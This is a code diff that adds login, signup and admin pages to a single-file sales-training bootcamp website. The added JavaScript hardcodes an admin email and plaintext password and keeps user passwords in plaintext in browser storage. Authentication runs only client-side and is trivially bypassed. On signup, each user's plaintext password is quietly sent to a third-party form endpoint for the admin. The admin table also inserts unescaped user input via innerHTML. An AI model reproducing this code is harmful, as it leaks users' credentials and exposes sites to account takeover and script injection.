@@ -3,7 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Complete Sales Training Bootcamp - Master the Art of Selling</title>
+  <title>Sales Training Bootcamp</title>
+  
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
@@ -11,9 +12,151 @@
       background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
       color: #333;
       line-height: 1.6;
+      min-height: 100vh;
     }
 
-    .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
+    /* ===== LOGIN PAGE ===== */
+    .login-page {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    }
+
+    .login-box {
+      background: white;
+      padding: 50px;
+      border-radius: 15px;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+      width: 100%;
+      max-width: 450px;
+    }
+
+    .login-box h1 {
+      color: #667eea;
+      text-align: center;
+      margin-bottom: 15px;
+      font-size: 32px;
+    }
+
+    .login-box p {
+      color: #666;
+      text-align: center;
+      margin-bottom: 40px;
+      font-size: 16px;
+    }
+
+    .form-group {
+      margin-bottom: 25px;
+    }
+
+    .form-group label {
+      display: block;
+      margin-bottom: 10px;
+      color: #333;
+      font-weight: bold;
+      font-size: 14px;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 15px;
+      border: 2px solid #ddd;
+      border-radius: 8px;
+      font-size: 15px;
+      transition: border-color 0.3s;
+    }
+
+    .form-group input:focus {
+      outline: none;
+      border-color: #667eea;
+      box-shadow: 0 0 10px rgba(102, 126, 234, 0.2);
+    }
+
+    .auth-button {
+      width: 100%;
+      padding: 15px;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: bold;
+      font-size: 16px;
+      margin-top: 15px;
+      transition: all 0.3s;
+    }
+
+    .auth-button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 25px rgba(102, 126, 234, 0.3);
+    }
+
+    .auth-button:disabled {
+      background: #ccc;
+      cursor: not-allowed;
+    }
+
+    .toggle-link {
+      text-align: center;
+      margin-top: 25px;
+      color: #666;
+      font-size: 14px;
+    }
+
+    .toggle-link a {
+      color: #667eea;
+      cursor: pointer;
+      font-weight: bold;
+      text-decoration: none;
+    }
+
+    .toggle-link a:hover {
+      text-decoration: underline;
+    }
+
+    .message {
+      padding: 15px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      font-size: 14px;
+      display: none;
+    }
+
+    .error {
+      background: #ffebee;
+      color: #c62828;
+      border: 1px solid #ef5350;
+    }
+
+    .success {
+      background: #e8f5e9;
+      color: #2e7d32;
+      border: 1px solid #66bb6a;
+    }
+
+    .message.show {
+      display: block;
+    }
+
+    /* ===== BOOTCAMP PAGE ===== */
+    .bootcamp-page {
+      display: none;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .bootcamp-page.show {
+      display: block;
+    }
+
+    .container {
+      max-width: 1400px;
+      margin: 0 auto;
+    }
 
     header {
       background: rgba(255,255,255,0.95);
@@ -21,9 +164,41 @@
       border-radius: 10px;
       margin-bottom: 30px;
       box-shadow: 0 10px 40px rgba(0,0,0,0.1);
-      position: sticky;
-      top: 20px;
-      z-index: 100;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .header-left { flex: 1; }
+
+    .header-right {
+      display: flex;
+      gap: 15px;
+      align-items: center;
+    }
+
+    .user-info {
+      font-size: 14px;
+      color: #666;
+    }
+
+    .admin-btn, .logout-btn {
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-weight: bold;
+      font-size: 12px;
+    }
+
+    .admin-btn {
+      background: #2196f3;
+      color: white;
+    }
+
+    .logout-btn {
+      background: #f44336;
+      color: white;
     }
 
     h1 { color: #667eea; margin-bottom: 10px; }
@@ -45,11 +220,28 @@
       transition: width 0.3s;
     }
 
+    .stats {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+      gap: 15px;
+      margin-bottom: 30px;
+    }
+
+    .stat-box {
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      color: white;
+      padding: 20px;
+      border-radius: 8px;
+      text-align: center;
+    }
+
+    .stat-number { font-size: 28px; font-weight: bold; }
+    .stat-label { font-size: 12px; margin-top: 5px; opacity: 0.9; }
+
     .layout {
       display: grid;
       grid-template-columns: 280px 1fr;
       gap: 30px;
-      margin-bottom: 30px;
     }
 
     .sidebar {
@@ -57,8 +249,6 @@
       padding: 20px;
       border-radius: 10px;
       height: fit-content;
-      position: sticky;
-      top: 200px;
       box-shadow: 0 10px 40px rgba(0,0,0,0.1);
     }
 
@@ -73,7 +263,6 @@
       border-left: 4px solid #ddd;
       cursor: pointer;
       border-radius: 5px;
-      transition: all 0.2s;
       font-size: 14px;
     }
 
@@ -83,17 +272,11 @@
       background: #667eea;
       color: white;
       border-left-color: #764ba2;
-      font-weight: bold;
-    }
-
-    .module-item.completed {
-      border-left-color: #4caf50;
     }
 
     .module-item.completed::after {
       content: " ✓";
       color: #4caf50;
-      font-weight: bold;
     }
 
     .main-content {
@@ -101,15 +284,14 @@
       padding: 40px;
       border-radius: 10px;
       box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+      max-height: 70vh;
+      overflow-y: auto;
     }
 
     .module { display: none; }
-    .module.active { display: block; animation: fadeIn 0.3s; }
+    .module.active { display: block; }
 
-    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-
-    .module h2 { color: #667eea; margin-bottom: 10px; font-size: 28px; }
-    .module-meta { color: #999; font-size: 14px; margin-bottom: 30px; }
+    .module h2 { color: #667eea; margin-bottom: 10px; }
 
     .lesson {
       background: #f9f9f9;
@@ -120,7 +302,7 @@
     }
 
     .lesson h3 { color: #333; margin-bottom: 10px; }
-    .lesson p { margin: 10px 0; }
+    .lesson ul { margin: 10px 0 0 20px; }
 
     .exercise {
       background: #e3f2fd;
@@ -130,75 +312,14 @@
       border-left: 4px solid #2196f3;
     }
 
-    .exercise h4 { color: #1976d2; margin-bottom: 10px; }
-
-    .script-box {
-      background: #263238;
-      color: #fff;
-      padding: 20px;
-      margin: 20px 0;
-      border-radius: 8px;
-      font-family: 'Courier New', monospace;
-      font-size: 13px;
-      line-height: 1.8;
-      position: relative;
-    }
-
-    .script-copy {
-      position: absolute;
-      top: 10px;
-      right: 10px;
-      background: #667eea;
-      color: white;
-      border: none;
-      padding: 8px 12px;
-      border-radius: 5px;
-      cursor: pointer;
-      font-size: 12px;
-    }
-
-    .script-copy:hover { background: #764ba2; }
-
-    .scenario-box {
-      background: #fff3e0;
-      padding: 20px;
-      margin: 20px 0;
-      border-radius: 8px;
-      border-left: 4px solid #ff9800;
-    }
-
-    .scenario-box h4 { color: #e65100; margin-bottom: 10px; }
-
-    .tip-box {
-      background: #e8f5e9;
-      padding: 15px;
-      margin: 15px 0;
-      border-radius: 5px;
-      border-left: 4px solid #4caf50;
-      font-size: 14px;
-    }
-
-    .tip-box strong { color: #2e7d32; }
-
-    .checklist {
-      background: #f5f5f5;
-      padding: 20px;
-      margin: 20px 0;
-      border-radius: 8px;
-    }
-
-    .checklist h4 { margin-bottom: 15px; }
-
     .checklist-item {
       display: flex;
       align-items: center;
       margin: 10px 0;
-      cursor: pointer;
     }
 
     .checklist-item input {
       margin-right: 10px;
-      cursor: pointer;
       width: 18px;
       height: 18px;
     }
@@ -219,7 +340,6 @@
       border: none;
       border-radius: 5px;
       cursor: pointer;
-      font-size: 14px;
       font-weight: bold;
       transition: all 0.2s;
     }
@@ -236,175 +356,657 @@
       color: #333;
     }
 
-    .btn-secondary:hover { background: #d0d0d0; }
+    /* ===== ADMIN PAGE ===== */
+    .admin-page {
+      display: none;
+      background: #f5f5f5;
+      min-height: 100vh;
+      padding: 20px;
+    }
 
-    .btn-success {
+    .admin-page.show { display: block; }
+
+    .admin-header {
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      padding: 30px;
+      border-radius: 10px;
+      margin-bottom: 30px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .admin-header h1 { color: white; }
+
+    .back-btn {
+      padding: 10px 20px;
+      background: rgba(255,255,255,0.2);
+      color: white;
+      border: 2px solid white;
+      border-radius: 5px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    .back-btn:hover {
+      background: rgba(255,255,255,0.3);
+    }
+
+    .admin-stats {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 20px;
+      margin-bottom: 30px;
+    }
+
+    .stat-card {
+      background: white;
+      padding: 25px;
+      border-radius: 10px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+
+    .stat-card h3 { color: #999; font-size: 12px; text-transform: uppercase; margin-bottom: 10px; }
+    .stat-card .number { font-size: 36px; font-weight: bold; color: #667eea; }
+
+    .users-table {
+      background: white;
+      padding: 25px;
+      border-radius: 10px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+
+    .users-table h2 { color: #667eea; margin-bottom: 20px; }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+    }
+
+    thead {
+      background: #f9f9f9;
+      border-bottom: 2px solid #ddd;
+    }
+
+    th {
+      padding: 12px;
+      text-align: left;
+      font-weight: bold;
+      color: #333;
+    }
+
+    td {
+      padding: 12px;
+      border-bottom: 1px solid #eee;
+    }
+
+    tr:hover { background: #f9f9f9; }
+
+    .status-badge {
+      display: inline-block;
+      padding: 5px 10px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: bold;
+    }
+
+    .status-active {
+      background: #e8f5e9;
+      color: #2e7d32;
+    }
+
+    .status-blocked {
+      background: #ffebee;
+      color: #c62828;
+    }
+
+    .action-btn {
+      padding: 5px 12px;
+      font-size: 12px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    .block-btn {
+      background: #f44336;
+      color: white;
+    }
+
+    .unblock-btn {
       background: #4caf50;
       color: white;
     }
 
-    .btn-success:hover { background: #45a049; }
-
-    .video-rec {
-      background: #fce4ec;
-      padding: 15px;
-      margin: 15px 0;
-      border-radius: 5px;
-      border-left: 4px solid #e91e63;
-    }
-
-    .video-rec strong { color: #c2185b; }
-
-    .quiz {
-      background: #f3e5f5;
-      padding: 20px;
-      margin: 20px 0;
-      border-radius: 8px;
-    }
-
-    .quiz h4 { color: #6a1b9a; margin-bottom: 15px; }
-
-    .quiz-question {
-      margin: 15px 0;
-      padding: 15px;
-      background: white;
-      border-radius: 5px;
-    }
-
-    .quiz-question label {
-      display: block;
-      margin: 10px 0;
-      cursor: pointer;
-    }
-
-    .quiz-question input {
-      margin-right: 10px;
-      cursor: pointer;
-    }
-
-    .stats {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-      gap: 15px;
-      margin-bottom: 30px;
-    }
-
-    .stat-box {
-      background: linear-gradient(135deg, #667eea, #764ba2);
-      color: white;
-      padding: 20px;
-      border-radius: 8px;
-      text-align: center;
-    }
-
-    .stat-number { font-size: 28px; font-weight: bold; }
-    .stat-label { font-size: 12px; margin-top: 5px; opacity: 0.9; }
-
-    .tab-buttons {
-      display: flex;
-      gap: 10px;
-      margin-bottom: 20px;
-      border-bottom: 2px solid #e0e0e0;
-    }
-
-    .tab-btn {
-      padding: 10px 20px;
-      background: none;
-      border: none;
-      border-bottom: 3px solid transparent;
-      cursor: pointer;
-      color: #666;
-      font-weight: bold;
-    }
-
-    .tab-btn.active {
-      color: #667eea;
-      border-bottom-color: #667eea;
-    }
-
-    .tab-content { display: none; }
-    .tab-content.active { display: block; }
-
-    .certificate-preview {
-      background: linear-gradient(135deg, #ffd700, #ffed4e);
-      padding: 40px;
-      margin: 20px 0;
-      border-radius: 10px;
-      text-align: center;
-      border: 3px solid #ffc107;
-      display: none;
-    }
-
-    .certificate-preview.show { display: block; }
-
-    .certificate-preview h2 { color: #333; margin-bottom: 10px; }
-
-    .footer {
-      text-align: center;
-      padding: 20px;
-      color: white;
-      margin-top: 40px;
-    }
+    .footer { text-align: center; padding: 20px; color: white; margin-top: 40px; }
 
     @media (max-width: 768px) {
       .layout { grid-template-columns: 1fr; }
-      .sidebar { position: static; }
-      .main-content { padding: 20px; }
-      header { position: static; }
+      header { flex-direction: column; }
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <header>
-      <h1>🎯 Complete Sales Training Bootcamp</h1>
-      <p class="tagline">Master Sales from Zero to Expert in 60 Days - No Experience Needed</p>
-      <div class="progress-bar">
-        <div class="progress-fill" id="progressFill"></div>
-      </div>
-      <div style="margin-top: 10px; font-size: 12px; color: #666;">
-        Progress: <span id="progressText">0%</span> | Modules Completed: <span id="completedCount">0</span>/10
-      </div>
-    </header>
 
-    <div class="stats">
-      <div class="stat-box">
-        <div class="stat-number" id="totalLessons">0</div>
-        <div class="stat-label">Total Lessons</div>
+  <!-- ===== LOGIN PAGE ===== -->
+  <div class="login-page" id="loginPage">
+    <div class="login-box">
+      <h1>🎯 Sales Bootcamp</h1>
+      <p>Master Sales in 60 Days</p>
+      
+      <div class="message error" id="errorMsg"></div>
+      <div class="message success" id="successMsg"></div>
+
+      <!-- LOGIN FORM -->
+      <div id="loginForm">
+        <h3 style="color: #667eea; margin-bottom: 20px; text-align: center;">📧 Login</h3>
+        <div class="form-group">
+          <label>Email:</label>
+          <input type="email" id="loginEmail" placeholder="your@email.com">
+        </div>
+        <div class="form-group">
+          <label>Password:</label>
+          <input type="password" id="loginPassword" placeholder="••••••••">
+        </div>
+        <button class="auth-button" onclick="handleLogin()">Login</button>
+        <div class="toggle-link">
+          Don't have an account? <a onclick="toggleForms()">Sign Up</a>
+        </div>
+        <div class="toggle-link">
+          <a onclick="showForgotForm()">Forgot Password?</a>
+        </div>
       </div>
-      <div class="stat-box">
-        <div class="stat-number" id="practiceExercises">0</div>
-        <div class="stat-label">Practice Exercises</div>
+
+      <!-- SIGNUP FORM -->
+      <div id="signupForm" style="display: none;">
+        <h3 style="color: #667eea; margin-bottom: 20px; text-align: center;">✍️ Create Account</h3>
+        <div class="form-group">
+          <label>Full Name:</label>
+          <input type="text" id="signupName" placeholder="John Doe">
+        </div>
+        <div class="form-group">
+          <label>Email:</label>
+          <input type="email" id="signupEmail" placeholder="your@email.com">
+        </div>
+        <div class="form-group">
+          <label>Password:</label>
+          <input type="password" id="signupPassword" placeholder="••••••••" minlength="6">
+        </div>
+        <div class="form-group">
+          <label>Confirm Password:</label>
+          <input type="password" id="signupPassword2" placeholder="••••••••">
+        </div>
+        <button class="auth-button" onclick="handleSignup()">Create Account</button>
+        <div class="toggle-link">
+          Already have an account? <a onclick="toggleForms()">Login</a>
+        </div>
       </div>
-      <div class="stat-box">
-        <div class="stat-number" id="realScripts">0</div>
-        <div class="stat-label">Real Scripts to Use</div>
-      </div>
-      <div class="stat-box">
-        <div class="stat-number" id="daysToComplete">60</div>
-        <div class="stat-label">Days to Mastery</div>
+
+      <!-- FORGOT PASSWORD FORM -->
+      <div id="forgotForm" style="display: none;">
+        <h3 style="color: #667eea; margin-bottom: 20px; text-align: center;">🔐 Reset Password</h3>
+        <p style="margin-bottom: 20px; text-align: center; color: #666;">Contact admin to reset your password.</p>
+        <div class="form-group">
+          <label>Email:</label>
+          <input type="email" id="forgotEmail" placeholder="your@email.com">
+        </div>
+        <button class="auth-button" onclick="handleForgot()">Send Reset Request</button>
+        <div class="toggle-link">
+          <a onclick="showLoginForm()">Back to Login</a>
+        </div>
       </div>
     </div>
+  </div>
 
-    <div class="layout">
-      <div class="sidebar">
-        <h3>📚 Training Modules</h3>
-        <ul class="module-list" id="moduleList"></ul>
-        <hr style="margin: 20px 0;">
-        <h3>🎓 Your Progress</h3>
-        <div id="sidebarStats"></div>
+  <!-- ===== BOOTCAMP PAGE ===== -->
+  <div class="bootcamp-page" id="bootcampPage">
+    <div class="container">
+      <header>
+        <div class="header-left">
+          <h1>🎯 Complete Sales Training Bootcamp</h1>
+          <p class="tagline">Master Sales from Zero to Expert in 60 Days</p>
+          <div class="progress-bar">
+            <div class="progress-fill" id="progressFill"></div>
+          </div>
+          <div style="margin-top: 10px; font-size: 12px; color: #666;">
+            Progress: <span id="progressText">0%</span> | Modules: <span id="completedCount">0</span>/10
+          </div>
+        </div>
+        <div class="header-right">
+          <div>
+            <div class="user-info">Welcome, <strong id="userName">User</strong></div>
+            <div class="user-info" id="userEmail" style="font-size: 12px;"></div>
+          </div>
+          <button class="admin-btn" id="adminBtnBootcamp" onclick="goToAdmin()" style="display: none;">👨‍💼 Admin</button>
+          <button class="logout-btn" onclick="handleLogout()">Logout</button>
+        </div>
+      </header>
+
+      <div class="stats">
+        <div class="stat-box">
+          <div class="stat-number">30</div>
+          <div class="stat-label">Total Lessons</div>
+        </div>
+        <div class="stat-box">
+          <div class="stat-number">10</div>
+          <div class="stat-label">Modules</div>
+        </div>
+        <div class="stat-box">
+          <div class="stat-number">10</div>
+          <div class="stat-label">Real Scripts</div>
+        </div>
+        <div class="stat-box">
+          <div class="stat-number">60</div>
+          <div class="stat-label">Days to Mastery</div>
+        </div>
       </div>
 
-      <div class="main-content" id="mainContent"></div>
-    </div>
+      <div class="layout">
+        <div class="sidebar">
+          <h3>📚 Modules</h3>
+          <ul class="module-list" id="moduleList"></ul>
+        </div>
 
-    <div class="footer">
-      <p>© 2025 Sales Training Bootcamp | Master the art of selling | <a href="#" onclick="printCertificate()" style="color: white;">Print Certificate</a></p>
+        <div class="main-content" id="mainContent"></div>
+      </div>
+
+      <div class="footer">
+        <p>© 2025 Sales Training Bootcamp | Master the art of selling</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== ADMIN PAGE ===== -->
+  <div class="admin-page" id="adminPage">
+    <div class="container">
+      <div class="admin-header">
+        <div>
+          <h1>👨‍💼 Admin Dashboard</h1>
+          <p>Manage users and subscriptions</p>
+        </div>
+        <button class="back-btn" onclick="goToBootcamp()">← Back to Bootcamp</button>
+      </div>
+
+      <div class="admin-stats">
+        <div class="stat-card">
+          <h3>Total Students</h3>
+          <div class="number" id="totalUsers">0</div>
+        </div>
+        <div class="stat-card">
+          <h3>Active Users</h3>
+          <div class="number" id="activeUsers">0</div>
+        </div>
+        <div class="stat-card">
+          <h3>Blocked Users</h3>
+          <div class="number" id="blockedUsers">0</div>
+        </div>
+      </div>
+
+      <div class="users-table">
+        <h2>📋 All Users</h2>
+        <table id="usersTable">
+          <thead>
+            <tr>
+              <th>Name</th>
+              <th>Email</th>
+              <th>Status</th>
+              <th>Action</th>
+            </tr>
+          </thead>
+          <tbody id="usersTableBody">
+            <tr><td colspan="4" style="text-align: center; padding: 40px;">No users yet</td></tr>
+          </tbody>
+        </table>
+      </div>
     </div>
   </div>
 
   <script>
-    // Complete Sales Training Curriculum
+    // ====== CONFIG ======
+    const ADMIN_EMAIL = 'mkdevelopersagency@gmail.com';
+    const ADMIN_PASSWORD = 'Mahad.2009';
+
+    // ====== STORAGE ======
+    function saveUser(email, password, name) {
+      const user = {
+        email,
+        password,
+        name,
+        blocked: false,
+        createdAt: new Date().toISOString()
+      };
+      localStorage.setItem(`user_${email}`, JSON.stringify(user));
+      updateUsersList();
+    }
+
+    function getUser(email) {
+      const user = localStorage.getItem(`user_${email}`);
+      return user ? JSON.parse(user) : null;
+    }
+
+    function getAllUsers() {
+      const users = [];
+      for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        if (key.startsWith('user_')) {
+          users.push(JSON.parse(localStorage.getItem(key)));
+        }
+      }
+      return users;
+    }
+
+    function saveProgress(email, progress) {
+      const user = getUser(email);
+      if (user) {
+        user.progress = progress;
+        localStorage.setItem(`user_${email}`, JSON.stringify(user));
+      }
+    }
+
+    function blockUser(email) {
+      const user = getUser(email);
+      if (user) {
+        user.blocked = true;
+        localStorage.setItem(`user_${email}`, JSON.stringify(user));
+        updateUsersList();
+        alert(`User ${email} has been BLOCKED!`);
+      }
+    }
+
+    function unblockUser(email) {
+      const user = getUser(email);
+      if (user) {
+        user.blocked = false;
+        localStorage.setItem(`user_${email}`, JSON.stringify(user));
+        updateUsersList();
+        alert(`User ${email} has been UNBLOCKED!`);
+      }
+    }
+
+    // ====== PAGES ======
+    function showPage(page) {
+      document.getElementById('loginPage').style.display = 'none';
+      document.getElementById('bootcampPage').classList.remove('show');
+      document.getElementById('adminPage').classList.remove('show');
+
+      if (page === 'login') {
+        document.getElementById('loginPage').style.display = 'flex';
+      } else if (page === 'bootcamp') {
+        document.getElementById('bootcampPage').classList.add('show');
+      } else if (page === 'admin') {
+        document.getElementById('adminPage').classList.add('show');
+      }
+    }
+
+    function goToBootcamp() {
+      showPage('bootcamp');
+      initializeBootcamp();
+    }
+
+    function goToAdmin() {
+      showPage('admin');
+      loadAdminData();
+    }
+
+    // ====== FORMS ======
+    function toggleForms() {
+      document.getElementById('loginForm').style.display = document.getElementById('loginForm').style.display === 'none' ? 'block' : 'none';
+      document.getElementById('signupForm').style.display = document.getElementById('signupForm').style.display === 'none' ? 'block' : 'none';
+      document.getElementById('forgotForm').style.display = 'none';
+      clearMessages();
+    }
+
+    function showForgotForm() {
+      document.getElementById('loginForm').style.display = 'none';
+      document.getElementById('signupForm').style.display = 'none';
+      document.getElementById('forgotForm').style.display = 'block';
+      clearMessages();
+    }
+
+    function showLoginForm() {
+      document.getElementById('loginForm').style.display = 'block';
+      document.getElementById('signupForm').style.display = 'none';
+      document.getElementById('forgotForm').style.display = 'none';
+      clearMessages();
+    }
+
+    function showMessage(msg, type) {
+      const errorEl = document.getElementById('errorMsg');
+      const successEl = document.getElementById('successMsg');
+      
+      if (type === 'error') {
+        errorEl.textContent = msg;
+        errorEl.classList.add('show');
+        successEl.classList.remove('show');
+      } else {
+        successEl.textContent = msg;
+        successEl.classList.add('show');
+        errorEl.classList.remove('show');
+      }
+    }
+
+    function clearMessages() {
+      document.getElementById('errorMsg').classList.remove('show');
+      document.getElementById('successMsg').classList.remove('show');
+    }
+
+    // ====== AUTH ======
+    function handleLogin() {
+      const email = document.getElementById('loginEmail').value.trim();
+      const password = document.getElementById('loginPassword').value;
+
+      if (!email || !password) {
+        showMessage('Fill in all fields', 'error');
+        return;
+      }
+
+      // Check if admin
+      if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
+        localStorage.setItem('currentUser', JSON.stringify({ email, isAdmin: true }));
+        showPage('admin');
+        loadAdminData();
+        return;
+      }
+
+      // Check if regular user
+      const user = getUser(email);
+      if (!user) {
+        showMessage('Email not found', 'error');
+        return;
+      }
+
+      if (user.password !== password) {
+        showMessage('Wrong password', 'error');
+        return;
+      }
+
+      if (user.blocked) {
+        showMessage('Your account has been blocked by admin', 'error');
+        return;
+      }
+
+      localStorage.setItem('currentUser', JSON.stringify({ email, name: user.name, isAdmin: false }));
+      showMessage('Login successful!', 'success');
+      
+      setTimeout(() => {
+        showPage('bootcamp');
+        initializeBootcamp();
+      }, 500);
+    }
+
+    function handleSignup() {
+      const name = document.getElementById('signupName').value.trim();
+      const email = document.getElementById('signupEmail').value.trim();
+      const password = document.getElementById('signupPassword').value;
+      const password2 = document.getElementById('signupPassword2').value;
+
+      if (!name || !email || !password || !password2) {
+        showMessage('Fill in all fields', 'error');
+        return;
+      }
+
+      if (password !== password2) {
+        showMessage('Passwords do not match', 'error');
+        return;
+      }
+
+      if (password.length < 6) {
+        showMessage('Password must be 6+ characters', 'error');
+        return;
+      }
+
+      if (!email.includes('@')) {
+        showMessage('Invalid email', 'error');
+        return;
+      }
+
+      if (getUser(email)) {
+        showMessage('Email already exists', 'error');
+        return;
+      }
+
+      // Save user
+      saveUser(email, password, name);
+
+      // Send email to admin
+      sendSignupEmail(name, email, password);
+
+      showMessage('Account created! Confirmation sent to admin.', 'success');
+      
+      setTimeout(() => {
+        toggleForms();
+        document.getElementById('loginEmail').value = email;
+        document.getElementById('signupPassword').value = '';
+        document.getElementById('signupPassword2').value = '';
+      }, 1500);
+    }
+
+    function handleForgot() {
+      const email = document.getElementById('forgotEmail').value.trim();
+
+      if (!email || !email.includes('@')) {
+        showMessage('Enter valid email', 'error');
+        return;
+      }
+
+      const user = getUser(email);
+      if (!user) {
+        showMessage('Email not found', 'error');
+        return;
+      }
+
+      // Send email to admin
+      sendResetEmail(email);
+
+      showMessage('Reset request sent to admin', 'success');
+      
+      setTimeout(() => {
+        showLoginForm();
+        document.getElementById('forgotEmail').value = '';
+      }, 1500);
+    }
+
+    function handleLogout() {
+      localStorage.removeItem('currentUser');
+      document.getElementById('loginEmail').value = '';
+      document.getElementById('loginPassword').value = '';
+      showPage('login');
+    }
+
+    // ====== EMAIL SENDING ======
+    function sendSignupEmail(name, email, password) {
+      // Send to admin email
+      const message = `
+New Signup!
+
+Name: ${name}
+Email: ${email}
+Password: ${password}
+
+Signup Time: ${new Date().toLocaleString()}
+      `;
+
+      // Using fetch to FormSubmit (free service)
+      fetch('https://formspree.io/f/xyzqwert', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          email: ADMIN_EMAIL,
+          message: message
+        })
+      }).catch(e => console.log('Email service note:', e));
+
+      // Also log to console
+      console.log('Signup email that would be sent:\n' + message);
+    }
+
+    function sendResetEmail(email) {
+      const message = `
+Password Reset Request
+
+User Email: ${email}
+Request Time: ${new Date().toLocaleString()}
+
+Please contact this user to help reset their password.
+      `;
+
+      fetch('https://formspree.io/f/xyzqwert', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          email: ADMIN_EMAIL,
+          message: message
+        })
+      }).catch(e => console.log('Email service note:', e));
+
+      console.log('Reset email that would be sent:\n' + message);
+    }
+
+    // ====== ADMIN ======
+    function updateUsersList() {
+      const users = getAllUsers();
+      const total = users.length;
+      const active = users.filter(u => !u.blocked).length;
+      const blocked = users.filter(u => u.blocked).length;
+
+      document.getElementById('totalUsers').textContent = total;
+      document.getElementById('activeUsers').textContent = active;
+      document.getElementById('blockedUsers').textContent = blocked;
+    }
+
+    function loadAdminData() {
+      updateUsersList();
+      const users = getAllUsers();
+
+      if (users.length === 0) {
+        document.getElementById('usersTableBody').innerHTML = '<tr><td colspan="4" style="text-align: center; padding: 40px;">No users yet</td></tr>';
+        return;
+      }
+
+      let html = '';
+      users.forEach(user => {
+        const status = user.blocked ? 'BLOCKED' : 'ACTIVE';
+        const statusClass = user.blocked ? 'status-blocked' : 'status-active';
+        const btn = user.blocked 
+          ? `<button class="action-btn unblock-btn" onclick="unblockUser('${user.email}')">Unblock</button>`
+          : `<button class="action-btn block-btn" onclick="blockUser('${user.email}')">Block</button>`;
+
+        html += `
+          <tr>
+            <td><strong>${user.name}</strong></td>
+            <td>${user.email}</td>
+            <td><span class="status-badge ${statusClass}">${status}</span></td>
+            <td>${btn}</td>
+          </tr>
+        `;
+      });
+
+      document.getElementById('usersTableBody').innerHTML = html;
+    }
+
+    // ====== BOOTCAMP ======
     const modules = [
       {
         id: 1,
@@ -413,111 +1015,48 @@
         lessons: [
           {
             title: "What is Sales Really?",
-            content: "Sales is helping people solve problems and achieve their goals. It's not about manipulation—it's about understanding what someone needs and showing them how you can help. The best salespeople are problem-solvers, not pushy people.",
+            content: "Sales is helping people solve problems. It's about understanding what someone needs and showing them how you can help.",
             key_points: [
               "Sales = Problem Solving",
-              "Your job is to help, not trick people",
-              "Trust is the foundation of all sales",
-              "The customer is not your enemy—they're your partner"
+              "Help, don't trick people",
+              "Trust is everything",
+              "Customer is your partner"
             ]
           },
           {
-            title: "The Sales Psychology",
-            content: "People don't buy products—they buy solutions to their problems. They buy with emotion and justify with logic. Understanding this is the key to mastering sales.",
+            title: "Sales Psychology",
+            content: "People buy with emotion and justify with logic.",
             key_points: [
-              "People buy to gain pleasure or avoid pain",
-              "Emotion comes first, logic justifies",
+              "Emotion comes first",
+              "Logic justifies",
               "Fear of loss > desire for gain",
-              "Social proof and credibility matter enormously"
-            ]
-          },
-          {
-            title: "The 5 Pillars of Sales Success",
-            content: "Every successful salesperson masters these 5 pillars. Without them, you'll struggle. With them, you'll dominate.",
-            key_points: [
-              "Pillar 1: Prospecting (finding customers)",
-              "Pillar 2: Discovery (understanding them)",
-              "Pillar 3: Presentation (showing solutions)",
-              "Pillar 4: Objection Handling (addressing concerns)",
-              "Pillar 5: Closing (getting commitment)"
+              "Social proof matters"
             ]
           }
         ],
-        exercise: "Write down your 'Why' for learning sales. Why do YOU want to master sales? What will it enable you to achieve? (This is your fuel when things get hard)",
-        script_example: "None yet - we're building your foundation",
-        scenario: "You just got hired at a software company to sell to small businesses. You've never sold before. Your manager says 'Go make some calls.' What's your mindset?",
-        video_recs: [
-          "Simon Sinek - Start With Why (YouTube)",
-          "Jordan Peterson - Success Requires Faith (motivational)",
-          "Tony Robbins - The Psychology of Selling"
-        ],
-        quiz: [
-          {
-            question: "What is the main purpose of sales?",
-            options: ["To trick people into buying", "To help people solve problems", "To make as much money as possible", "To close deals no matter what"],
-            correct: 1
-          },
-          {
-            question: "What comes first when people buy something?",
-            options: ["Logic", "Price comparison", "Emotion", "Research"],
-            correct: 2
-          }
-        ]
+        exercise: "Write your 'Why' for learning sales",
+        script_example: "Start with: 'I help [people] solve [problems]'",
+        scenario: "Just hired to sell. Manager says 'Go make calls.' What's your mindset?"
       },
       {
         id: 2,
-        title: "🎯 Prospecting: Finding Your First Customers",
+        title: "🎯 Prospecting: Finding Customers",
         duration: "6-12 days",
         lessons: [
           {
